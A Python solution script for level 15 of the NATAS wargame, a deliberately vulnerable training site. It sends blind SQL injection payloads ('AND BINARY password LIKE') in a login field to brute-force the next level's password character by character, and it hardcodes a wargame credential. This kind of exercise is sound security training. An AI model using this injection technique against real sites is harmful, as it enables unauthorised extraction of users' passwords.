
# Code for solving Level 15 of NATAS.
import requests
import re
from string import ascii_uppercase, ascii_lowercase, digits

characters = ascii_uppercase + ascii_lowercase + digits

present_user = 'natas15'
present_level_15_pwd = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'

url = 'http://%s.natas.labs.overthewire.org/index.php' % present_user

session = requests.Session()

brute_pwd = []
while (len(brute_pwd) != 32):
    for each_char in characters:
        # print("try %s" %"".join(brute_pwd) + each_char)
        data_text = {
            "username": 'natas16" AND BINARY password LIKE"' + "".join(brute_pwd) + each_char + '%'
            }
        response = session.post(url,
                                data=data_text,
            auth=(present_user, present_level_15_pwd)
        )
        response_content = response.text
        if ('This user exists' in response_content):
            brute_pwd.append(each_char)
            break
    print("Found partial", "".join(brute_pwd))

print(brute_pwd)
